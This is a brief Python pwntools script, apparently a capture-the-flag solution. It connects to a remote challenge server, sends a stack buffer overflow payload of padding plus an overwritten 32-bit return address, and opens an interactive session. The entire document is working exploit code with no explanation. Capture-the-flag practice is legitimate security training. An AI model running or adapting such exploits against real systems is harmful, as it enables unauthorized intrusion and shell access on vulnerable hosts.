from pwn import *

sh=remote("node5.buuoj.cn",26702)

payload=0x2c*b'a'+p32(0x080485CB)
sh.sendline(payload)

sh.interactive()
